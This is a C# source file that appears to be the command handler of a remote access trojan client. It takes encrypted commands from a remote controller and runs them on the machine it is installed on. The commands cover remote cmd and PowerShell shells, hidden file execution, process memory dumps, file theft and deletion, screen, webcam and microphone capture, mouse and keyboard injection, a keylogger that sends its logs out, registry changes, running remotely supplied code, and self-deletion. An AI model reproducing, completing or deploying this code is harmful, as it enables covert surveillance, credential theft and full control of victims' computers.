using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using MessagePack;

namespace Client.HandlePacket
{
    internal class Packet
    {
        public static List<HandleShell> handleShells = new List<HandleShell>();
        public static List<HandlePowershell> handlePowershells = new List<HandlePowershell>();
        public static List<HandleDesktop> handleDesktops = new List<HandleDesktop>();
        public static List<HandleCamera> handleCameras = new List<HandleCamera>();
        public static List<HandleVoice> handleVoices = new List<HandleVoice>();
        public static HandleThumbnail thumbnail;

        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Helper.Helper.Aes.Decrypt((byte[])data));
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "controlerClose":
                    {
                        if (handleShells.Count > 0)
                            foreach (var item in handleShells)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.ShellClose();
                                    handleShells.Remove(item);
                                }

                        if (handlePowershells.Count > 0)
                            foreach (var item in handlePowershells)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.ShellClose();
                                    handlePowershells.Remove(item);
                                }

                        if (handleVoices.Count > 0)
                            foreach (var item in handleVoices)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.Stop();
                                    handleVoices.Remove(item);
                                }

                        if (handleDesktops.Count > 0)
                            foreach (var item in handleDesktops)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.IsOk = false;
                                    handleDesktops.Remove(item);
                                }

                        if (handleDesktops.Count > 0)
                            foreach (var item in handleDesktops)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.IsOk = false;
                                    handleDesktops.Remove(item);
                                }

                        break;
                    }

                    case "shell":
                    {
                        var handleCMD = new HandleShell
                        {
                            Controler_HWID = unpack_msgpack.ForcePathObject("HWID").AsString
                        };
                        handleShells.Add(handleCMD);
                        handleCMD.StarShell();
                        break;
                    }

                    case "shellWriteInput":
                    {
                        if (handleShells.Count > 0)
                            foreach (var item in handleShells)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                    item.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                        break;
                    }

                    case "shellClose":
                    {
                        if (handleShells.Count > 0)
                            foreach (var item in handleShells)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.ShellClose();
                                    handleShells.Remove(item);
                                }

                        break;
                    }

                    case "powershell":
                    {
                        var handlePowershell = new HandlePowershell
                        {
                            Controler_HWID = unpack_msgpack.ForcePathObject("HWID").AsString
                        };
                        handlePowershells.Add(handlePowershell);
                        handlePowershell.StarShell();
                        break;
                    }

                    case "powershellWriteInput":
                    {
                        if (handlePowershells.Count > 0)
                            foreach (var item in handlePowershells)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                    item.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                        break;
                    }

                    case "powershellClose":
                    {
                        if (handlePowershells.Count > 0)
                            foreach (var item in handlePowershells)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.ShellClose();
                                    handlePowershells.Remove(item);
                                }

                        break;
                    }

                    case "process":
                    {
                        HandleProcess.ProcessList(unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }

                    case "processKill":
                    {
                        HandleProcess.ProcessKill(unpack_msgpack.ForcePathObject("HWID").AsString,
                            Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                        break;
                    }

                    case "processDump":
                    {
                        HandleProcess.Minidump(unpack_msgpack.ForcePathObject("HWID").AsString,
                            Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                        break;
                    }

                    case "getDrivers":
                    {
                        try
                        {
                            HandleFile.GetDrivers(unpack_msgpack.ForcePathObject("HWID").AsString);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "getPath":
                    {
                        try
                        {
                            HandleFile.GetPath(unpack_msgpack.ForcePathObject("HWID").AsString,
                                unpack_msgpack.ForcePathObject("Path").AsString);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "deleteFile":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            File.Delete(fullPath);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "execute":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            Process.Start(fullPath);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "executeHidden":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            var process = new Process();
                            process.StartInfo.FileName = fullPath;
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.Start();
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "executeNewDesktop":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            HandleFile.ExecuteNewDesktop(fullPath, unpack_msgpack.ForcePathObject("HWID").AsString);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "createFolder":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                            if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "deleteFolder":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                            if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "copyFile":
                    {
                        try
                        {
                            foreach (var item in HandleFile.Copies)
                                if (item.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
                                    break;
                                }

                            var copy = new HandleFile.Copy
                            {
                                HWID = unpack_msgpack.ForcePathObject("HWID").AsString,
                                FileCopy = unpack_msgpack.ForcePathObject("File").AsString
                            };
                            HandleFile.Copies.Add(copy);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "pasteFile":
                    {
                        try
                        {
                            string filecopy = null;
                            foreach (var item in HandleFile.Copies)
                                if (item.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                    filecopy = item.FileCopy;
                            var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                            if (fullPath.Length > 0 && filecopy != null)
                            {
                                var filesArray = filecopy.Split(new[] {"-=>"}, StringSplitOptions.None);
                                foreach (var t in filesArray)
                                    try
                                    {
                                        if (t.Length > 0)
                                        {
                                            if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
                                                File.Copy(t, Path.Combine(fullPath, Path.GetFileName(t)), true);
                                            else
                                                File.Move(t, Path.Combine(fullPath, Path.GetFileName(t)));
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                                    }

                                foreach (var item in HandleFile.Copies)
                                    if (item.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                        item.FileCopy = null;
                            }
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "renameFile":
                    {
                        try
                        {
                            File.Move(unpack_msgpack.ForcePathObject("File").AsString,
                                unpack_msgpack.ForcePathObject("NewName").AsString);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "renameFolder":
                    {
                        try
                        {
                            Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString,
                                unpack_msgpack.ForcePathObject("NewName").AsString);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "zip":
                    {
                        try
                        {
                            if (!HandleFile.CheckForSevenZip())
                                HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").ToString(),
                                    "7-zip hasn't installed.");
                            if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
                            {
                                var sb = new StringBuilder();
                                var location = new StringBuilder();
                                foreach (var path in unpack_msgpack.ForcePathObject("Path").AsString
                                             .Split(new[] {"-=>"}, StringSplitOptions.None))
                                    if (!(path == null || path == ""))
                                    {
                                        sb.Append($"-ir!\"{path}\" ");
                                        if (location.Length == 0) location.Append(Path.GetFullPath(path));
                                    }

                                HandleFile.ZipCommandLine(sb.ToString(), true, location.ToString());
                            }
                            else
                            {
                                HandleFile.ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false, "");
                            }
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "install7Zip":
                    {
                        try
                        {
                            if (File.Exists(HandleFile.ZipPath))
                                HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString,
                                    "7-zip already installed.");
                            if (!Directory.Exists(Path.GetTempPath() + "\\7-Zip"))
                                Directory.CreateDirectory(Path.GetTempPath() + "\\7-Zip");
                            File.WriteAllBytes(HandleFile.ZipPath, unpack_msgpack.ForcePathObject("File").GetAsBytes());
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, "7-zip installed.");
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "updateFile":
                    {
                        try
                        {
                            var fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                            if (File.Exists(fullPath))
                            {
                                File.Delete(fullPath);
                                Thread.Sleep(500);
                            }

                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "downloadFile":
                    {
                        try
                        {
                            if (new FileInfo(unpack_msgpack.ForcePathObject("File").AsString).Length >= 2147483647)
                                HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString,
                                    "Don't support files larger than 2GB.");

                            var file = unpack_msgpack.ForcePathObject("File").AsString;
                            var dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                            var handleFile = new HandleFile();
                            handleFile.DownnloadFile(file, dwid, unpack_msgpack.ForcePathObject("HWID").AsString);
                        }
                        catch (Exception ex)
                        {
                            HandleFile.Error(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                        break;
                    }

                    case "capture":
                    {
                        HandleDesktop handleDesktop = null;
                        if (handleDesktops.Count > 0)
                            foreach (var item in handleDesktops)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                    handleDesktop = item;
                        if (handleDesktop == null)
                        {
                            handleDesktop = new HandleDesktop
                            {
                                Controler_HWID = unpack_msgpack.ForcePathObject("HWID").AsString
                            };
                            handleDesktops.Add(handleDesktop);
                        }

                        if (handleDesktop.IsOk) return;

                        handleDesktop.IsOk = true;
                        handleDesktop.CaptureAndSend(
                            Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger),
                            Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                        break;
                    }

                    case "mouseClick":
                    {
                        Native.mouse_event((int) unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                        break;
                    }

                    case "mouseMove":
                    {
                        var position = new Point((int) unpack_msgpack.ForcePathObject("X").AsInteger,
                            (int) unpack_msgpack.ForcePathObject("Y").AsInteger);
                        Cursor.Position = position;
                        break;
                    }

                    case "captureStop":
                    {
                        if (handleDesktops.Count > 0)
                            foreach (var item in handleDesktops)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.IsOk = false;
                                    handleDesktops.Remove(item);
                                }

                        break;
                    }

                    case "captureClose":
                    {
                        if (handleDesktops.Count > 0)
                            foreach (var item in handleDesktops)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.IsOk = false;
                                    handleDesktops.Remove(item);
                                }

                        break;
                    }

                    case "keyboardClick":
                    {
                        var keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
                        var key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);
                        Native.keybd_event(key, 0, keyDown ? 0x0000 : (uint) 0x0002, UIntPtr.Zero);
                        break;
                    }

                    case "webcamGet":
                    {
                        HandleCamera handleCamera = null;
                        if (handleCameras.Count > 0)
                            foreach (var item in handleCameras)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                    handleCamera = item;
                        if (handleCamera == null)
                        {
                            handleCamera = new HandleCamera
                            {
                                Controler_HWID = unpack_msgpack.ForcePathObject("HWID").AsString
                            };
                            handleCameras.Add(handleCamera);
                        }

                        HandleCamera.GetWebcams(unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }

                    case "webcamStart":
                    {
                        HandleCamera handleCamera = null;
                        if (handleCameras.Count > 0)
                            foreach (var item in handleCameras)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    handleCamera = item;
                                    if (handleCamera.IsOk) return;

                                    handleCamera.IsOk = true;
                                    var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                                    handleCamera.FinalVideo = new VideoCaptureDevice(
                                        videoCaptureDevices[(int) unpack_msgpack.ForcePathObject("List").AsInteger]
                                            .MonikerString);
                                    handleCamera.Quality = (int) unpack_msgpack.ForcePathObject("Quality").AsInteger;
                                    handleCamera.FinalVideo.NewFrame += handleCamera.CaptureRun;
                                    handleCamera.FinalVideo.VideoResolution =
                                        handleCamera.FinalVideo.VideoCapabilities[
                                            unpack_msgpack.ForcePathObject("List").AsInteger];
                                    Debug.WriteLine(unpack_msgpack.ForcePathObject("List").AsInteger);
                                    handleCamera.FinalVideo.Start();
                                }

                        break;
                    }

                    case "webcamStop":
                    {
                        HandleCamera handleCamera = null;
                        if (handleCameras.Count > 0)
                            foreach (var item in handleCameras)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    handleCamera = item;

                                    handleCamera.CaptureDispose();
                                    handleCameras.Remove(handleCamera);
                                }

                        break;
                    }

                    case "webcamClose":
                    {
                        if (handleCameras.Count > 0)
                            foreach (var item in handleCameras)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.CaptureDispose();
                                    handleCameras.Remove(item);
                                }

                        break;
                    }

                    case "network":
                    {
                        HandleNetwork.NetstatList(unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }

                    case "networkKill":
                    {
                        HandleNetwork.Kill(unpack_msgpack.ForcePathObject("HWID").AsString,
                            Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                        break;
                    }

                    case "device":
                    {
                        HandleDevice.GetAllDevices(unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }

                    case "deviceSet":
                    {
                        var utf8 = Encoding.UTF8.GetBytes(unpack_msgpack.ForcePathObject("ID").AsString);

                        var strencode = Encoding.UTF8.GetString(utf8);
                        foreach (var temporaryDeviceInfo in HandleDevice.EnumerateDevices())
                            if (temporaryDeviceInfo.GetProperty(Native.SPDRP.SPDRP_HARDWAREID) == strencode)
                            {
                                HandleDevice.EnableDevice(temporaryDeviceInfo.HDevInfo, temporaryDeviceInfo.DeviceData,
                                    Convert.ToBoolean(unpack_msgpack.ForcePathObject("Enable").AsString));
                                HandleDevice.GetAllDevices(unpack_msgpack.ForcePathObject("HWID").AsString);
                            }

                        break;
                    }

                    case "codedom":
                    {
                        var source = unpack_msgpack.ForcePathObject("Source").AsString;
                        var referencedAssemblies = unpack_msgpack.ForcePathObject("References").AsString
                            .Split(new[] {"-=>"}, StringSplitOptions.RemoveEmptyEntries);
                        HandlePlugin.PluginLoad(source, referencedAssemblies, 
                            unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }

                    case "LoadRegistryKey":
                    {
                        var RootKeyName = unpack_msgpack.ForcePathObject("RootKeyName").AsString;
                        HandleRegEdit.LoadKey(RootKeyName, unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "CreateRegistryKey":
                    {
                        var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                        HandleRegEdit.CreateKey(ParentPath, unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "DeleteRegistryKey":
                    {
                        var KeyName = unpack_msgpack.ForcePathObject("KeyName").AsString;
                        var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                        HandleRegEdit.DeleteKey(KeyName, ParentPath, unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "RenameRegistryKey":
                    {
                        var OldKeyName = unpack_msgpack.ForcePathObject("OldKeyName").AsString;
                        var NewKeyName = unpack_msgpack.ForcePathObject("NewKeyName").AsString;
                        var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                        HandleRegEdit.RenameKey(OldKeyName, NewKeyName, ParentPath,
                            unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "CreateRegistryValue":
                    {
                        var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                        var Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                        HandleRegEdit.CreateValue(KeyPath, Kindstring, unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "DeleteRegistryValue":
                    {
                        var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                        var ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;
                        HandleRegEdit.DeleteValue(KeyPath, ValueName, unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "RenameRegistryValue":
                    {
                        var OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                        var NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;
                        var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                        HandleRegEdit.RenameValue(OldValueName, NewValueName, KeyPath,
                            unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "ChangeRegistryValue":
                    {
                        var Valuebyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
                        var Value = HandleRegEdit.DeSerializeRegValueData(Valuebyte);
                        HandleRegEdit.ChangeValue(Value, unpack_msgpack.ForcePathObject("KeyPath").AsString,
                            unpack_msgpack.ForcePathObject("HWID").AsString);
                        break;
                    }
                    case "voice":
                    {
                        var handleVoice = new HandleVoice
                        {
                            Controler_HWID = unpack_msgpack.ForcePathObject("HWID").AsString
                        };
                        handleVoices.Add(handleVoice);
                        handleVoice.OpenAudio(44100, 16, 2);
                        //handleVoice.Start();
                        break;
                    }

                    case "voiceClose":
                    {
                        if (handleVoices.Count > 0)
                            foreach (var item in handleVoices)
                                if (item.Controler_HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
                                {
                                    item.Stop();
                                    handleVoices.Remove(item);
                                }

                        break;
                    }

                    case "keylogger":
                    {
                        var keylogger = (HandleKeylogger) Application.OpenForms["keylogger"];
                        if (keylogger == null)
                        {
                            keylogger = new HandleKeylogger();
                            keylogger.Name = "keylogger";
                            if (!keylogger.controlers.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                                keylogger.controlers.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                            keylogger.ShowDialog();
                        }

                        break;
                    }

                    case "keyloggerStop":
                    {
                        var keylogger = (HandleKeylogger) Application.OpenForms["keylogger"];
                        if (keylogger != null)
                        {
                            if (keylogger.controlers.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                                keylogger.controlers.Remove(unpack_msgpack.ForcePathObject("HWID").AsString);
                            if (keylogger.controlers.Count == 0 && !keylogger.offline) keylogger.Close();
                        }

                        break;
                    }

                    case "keyloggerSave":
                    {
                        var keylogger = (HandleKeylogger) Application.OpenForms["keylogger"];
                        if (keylogger != null)
                        {
                            var sr = new StreamReader(keylogger.file);
                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "keyLoggerSave";
                            msgpack.ForcePathObject("Controler_HWID").AsString =
                                unpack_msgpack.ForcePathObject("HWID").AsString;
                            msgpack.ForcePathObject("log").AsString = sr.ReadToEnd();
                            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                            sr.Close();
                        }

                        break;
                    }

                    case "thumbnail":
                    {
                        if (thumbnail == null)
                        {
                            thumbnail = new HandleThumbnail();
                            thumbnail.controlers.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                            thumbnail.Start();
                        }
                        else
                        {
                            thumbnail.controlers.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                        }

                        break;
                    }

                    case "thumbnailStop":
                    {
                        try
                        {
                            thumbnail.controlers.Remove(unpack_msgpack.ForcePathObject("HWID").AsString);
                        }
                        catch (Exception ex)
                        {
                            Program.TCP_Socket.Log(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                            break;
                    }

                    case "option":
                    {
                        try
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "Stop":
                                {
                                    HandleOption.Stop();
                                    break;
                                }
                                case "Disconnnect":
                                {
                                    HandleOption.Disconnnect();
                                    break;
                                }
                                case "Restart":
                                {
                                    HandleOption.Restart();
                                    break;
                                }
                                case "Update":
                                {
                                    HandleOption.Update(unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                    break;
                                }
                                case "DeleteSelf":
                                {
                                    HandleOption.DeleteSelf();
                                    break;
                                }
                                case "ReBoot":
                                {
                                    HandleOption.ReBoot();
                                    break;
                                }
                                case "PowerOff":
                                {
                                    HandleOption.PowerOff();
                                    break;
                                }
                                case "LogOut":
                                {
                                    HandleOption.LogOut();
                                    break;
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Program.TCP_Socket.Log(unpack_msgpack.ForcePathObject("HWID").AsString, ex.Message);
                        }

                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Source+" : "+ex.Message);
                //Error(ex.Message,null);
            }
        }

        public static void Error(string ex, string hwid)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Message").AsString = ex;
            msgpack.ForcePathObject("Controler_HWID").AsString = hwid;
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string log, string hwid)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Log";
            msgpack.ForcePathObject("Message").AsString = log;
            msgpack.ForcePathObject("Controler_HWID").AsString = hwid;
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }
    }
}